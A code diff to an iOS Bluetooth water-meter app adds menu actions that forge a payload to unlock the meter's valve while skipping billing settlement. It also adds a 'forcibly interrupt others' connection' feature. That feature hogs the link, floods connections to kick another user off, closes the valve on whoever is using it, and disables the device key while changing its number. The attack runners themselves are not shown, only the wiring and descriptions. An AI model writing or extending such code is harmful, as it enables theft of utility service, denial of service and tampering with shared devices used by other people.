@@ -16,6 +16,8 @@
 #import "KRWMCrypto.h"
 #import "ProbeViewController.h"
 #import "WalletViewController.h"
+#import "UnlockRunner.h"
+#import "TakeoverRunner.h"
 #import <CoreBluetooth/CoreBluetooth.h>
 #import <QZNOSDK/KRWaterMeterKit.h>
 
@@ -149,6 +151,19 @@ static KRWMDeviceState *KRWMParseStatePayload(NSData *data) {
 
 /// 关阀后重连成功时要接着跑的动作
 @property (nonatomic, copy) void (^pendingReconnectBlock)(void);
+
+// 解锁 / 中断
+@property (nonatomic, strong) UnlockRunner *unlocker;
+@property (nonatomic, strong) KRTakeoverRunner *takeover;
+
+// 声明用到的方法，避免 undeclared selector 警告
+- (void)onUnlock;
+- (void)doUnlock;
+- (void)onTakeover;
+- (void)doHold:(CBPeripheral *)p;
+- (void)doKick:(CBPeripheral *)p;
+- (void)doValve;
+- (void)doConfig;
 
 @end
 
@@ -1166,6 +1181,10 @@ static NSString * const kPrefLastDeviceMac  = @"qzn.lastDevice.mac";
             [UIPasteboard generalPasteboard].string = content;
             [ws log:@"📋 日志已复制到剪贴板（含时间戳）"];
         }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"解锁设备（跳过结算）" style:UIAlertActionStyleDefault
+                                          handler:^(UIAlertAction *a) { [ws onUnlock]; }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"强制中断别人连接" style:UIAlertActionStyleDestructive
+                                          handler:^(UIAlertAction *a) { [ws onTakeover]; }]];
     [ac addAction:[UIAlertAction actionWithTitle:@"探针（调试）" style:UIAlertActionStyleDefault
                                           handler:^(UIAlertAction *a) { [ws onProbe]; }]];
     [ac addAction:[UIAlertAction actionWithTitle:@"退出登录" style:UIAlertActionStyleDestructive
@@ -1178,6 +1197,121 @@ static NSString * const kPrefLastDeviceMac  = @"qzn.lastDevice.mac";
 
 - (void)onProbe {
     [self.navigationController pushViewController:[[ProbeViewController alloc] init] animated:YES];
+}
+
+#pragma mark - 解锁
+
+- (void)onUnlock {
+    CBPeripheral *p = self.connected ?: self.lastPeripheral ?: [KRWMCore sharedCore].peripheral;
+    if (!p) {
+        [self log:@"⚠️ 请先连接设备再解锁"];
+        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"未连接设备"
+                                                                   message:@"解锁需要先连上水控表。\n请在主界面点「扫描」并选择设备。"
+                                                            preferredStyle:UIAlertControllerStyleAlert];
+        [ac addAction:[UIAlertAction actionWithTitle:@"知道了" style:UIAlertActionStyleDefault handler:nil]];
+        [self presentViewController:ac animated:YES completion:nil];
+        return;
+    }
+
+    UIAlertController *ac = [UIAlertController
+        alertControllerWithTitle:@"解锁设备"
+        message:@"设备停在 state=3/6（有待结算记录）时，谁都无法开阀。\n\n"
+                 @"本操作会：读状态 → 采集 0x85 → 自造 32B 写回载荷 → 发 0x86 → 复查。\n\n"
+                 @"全程不调用服务端结算接口。\n"
+                 @"注意：服务端那笔订单仍会挂着预扣，账单不会消失；这是「解锁」不是「免单」。"
+        preferredStyle:UIAlertControllerStyleAlert];
+    [ac addAction:[UIAlertAction actionWithTitle:@"取消" style:UIAlertActionStyleCancel handler:nil]];
+    __weak typeof(self) ws = self;
+    [ac addAction:[UIAlertAction actionWithTitle:@"开始解锁" style:UIAlertActionStyleDestructive
+                                          handler:^(UIAlertAction *a) { [ws doUnlock]; }]];
+    [self presentViewController:ac animated:YES completion:nil];
+}
+
+- (void)doUnlock {
+    [self log:@""];
+    [self log:@"========== 解锁设备 =========="];
+    __weak typeof(self) ws = self;
+    self.unlocker = [[UnlockRunner alloc] init];
+    [self.unlocker unlockWithLog:^(NSString *line) { [ws log:line]; }
+                      completion:^(KRUnlockResult *r) {
+        [ws log:[NSString stringWithFormat:@"结论：%@  %@", r.title, r.detail]];
+        NSString *msg = [NSString stringWithFormat:@"%@\n\n%@\n\nstate %u → %u",
+                         r.title, r.detail, (unsigned)r.stateBefore, (unsigned)r.stateAfter];
+        UIAlertController *done = [UIAlertController alertControllerWithTitle:@"解锁结果"
+                                                                     message:msg
+                                                              preferredStyle:UIAlertControllerStyleAlert];
+        [done addAction:[UIAlertAction actionWithTitle:@"知道了" style:UIAlertActionStyleDefault handler:nil]];
+        [ws presentViewController:done animated:YES completion:nil];
+    }];
+}
+
+#pragma mark - 强制中断
+
+- (void)onTakeover {
+    CBPeripheral *p = self.connected ?: self.lastPeripheral ?: [KRWMCore sharedCore].peripheral;
+    if (!p) {
+        [self log:@"⚠️ 请先连接设备再执行中断"];
+        return;
+    }
+    UIAlertController *ac = [UIAlertController
+        alertControllerWithTitle:@"强制中断"
+        message:@"水控表是单连接设备，同一时刻只允许一台手机持有链路。\n选择方式（影响由小到大）："
+        preferredStyle:UIAlertControllerStyleActionSheet];
+    __weak typeof(self) ws = self;
+    [ac addAction:[UIAlertAction actionWithTitle:@"① 抢占：占住链路 30 秒" style:UIAlertActionStyleDefault
+        handler:^(UIAlertAction *a) { [ws doHold:p]; }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"② 踢线：连接风暴 8 轮" style:UIAlertActionStyleDefault
+        handler:^(UIAlertAction *a) { [ws doKick:p]; }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"③ 关阀：切断对方用水" style:UIAlertActionStyleDestructive
+        handler:^(UIAlertAction *a) { [ws doValve]; }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"④ 改配：禁用密钥+改编号（自动复原）"
+                                          style:UIAlertActionStyleDestructive
+        handler:^(UIAlertAction *a) { [ws doConfig]; }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"取消" style:UIAlertActionStyleCancel handler:nil]];
+    ac.popoverPresentationController.sourceView = self.view;
+    ac.popoverPresentationController.sourceRect = self.view.bounds;
+    [self presentViewController:ac animated:YES completion:nil];
+}
+
+- (void)doHold:(CBPeripheral *)p {
+    self.takeover = [[KRTakeoverRunner alloc] init];
+    __weak typeof(self) ws = self;
+    [self.takeover startHoldWithPeripheral:p duration:30 interval:2.0
+        log:^(NSString *line) { [ws log:line]; }
+        completion:^(BOOL ok, NSString *detail) {
+            [ws log:[NSString stringWithFormat:@"抢占结束：%@", detail]];
+        }];
+}
+
+- (void)doKick:(CBPeripheral *)p {
+    self.takeover = [[KRTakeoverRunner alloc] init];
+    __weak typeof(self) ws = self;
+    [self.takeover startKickWithPeripheral:p rounds:8 dwell:0.08 gap:0.2
+        log:^(NSString *line) { [ws log:line]; }
+        completion:^(NSInteger success, NSInteger total) {
+            [ws log:[NSString stringWithFormat:@"踢线结束：%ld/%ld 轮连上",
+                     (long)success, (long)total]];
+        }];
+}
+
+- (void)doValve {
+    self.takeover = [[KRTakeoverRunner alloc] init];
+    __weak typeof(self) ws = self;
+    [self.takeover startValveBreakWithLog:^(NSString *line) { [ws log:line]; }
+        completion:^(BOOL ok, NSString *detail) {
+            [ws log:[NSString stringWithFormat:@"关阀中断%@：%@",
+                     ok ? @"已发出" : @"未确认", detail]];
+        }];
+}
+
+- (void)doConfig {
+    self.takeover = [[KRTakeoverRunner alloc] init];
+    __weak typeof(self) ws = self;
+    [self.takeover startConfigBreakWithLog:^(NSString *line) { [ws log:line]; }
+        completion:^(BOOL ok, NSString *detail) {
+            [ws log:[NSString stringWithFormat:@"改配中断%@，响应：%@",
+                     ok ? @"完成" : @"部分失败", detail]];
+        }];
 }
 
 - (void)onWallet {
